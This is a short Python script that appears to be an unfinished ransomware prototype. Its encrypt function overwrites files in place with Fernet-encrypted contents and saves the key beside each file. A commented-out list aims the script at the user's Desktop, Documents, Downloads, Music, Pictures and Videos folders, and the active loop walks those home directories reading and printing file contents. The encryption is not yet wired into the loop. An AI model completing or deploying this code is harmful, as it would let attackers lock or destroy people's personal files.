from cryptography.fernet import Fernet
import tkinter
import random
import os



def encrypt(filename):
    key = Fernet.generate_key()
    with open(f"{filename}.key", "wb") as f:
        f.write(key)

    with open(filename, "rb") as f:
        contents = f.read()
    with open(filename, "wb") as f:
        f.write(Fernet(key).encrypt(contents))

def decrypt(filename):
    with open(f"{filename}.key", "rb") as f:
        key = f.read()

    with open(filename, "rb") as f:
        contents = f.read()
    with open(filename, "wb") as f:
        f.write(Fernet(key).decrypt(contents))

# main_dirs = ["desktop", "documents", "downloads", "music", "pictures", "videos"]
main_dirs = ["test"]
home = os.path.expanduser("~")

key = Fernet.generate_key()

for directory in os.listdir(home):
    if directory.lower() in main_dirs:
        for root, dirs, files in os.walk(os.path.join(home, directory)):
            for filename in files:
                with open(os.path.join(root, filename), "rb") as f:
                    contents = f.read()
                
                print(os.path.join(root, filename))
                print(contents)
                input("press enter for next")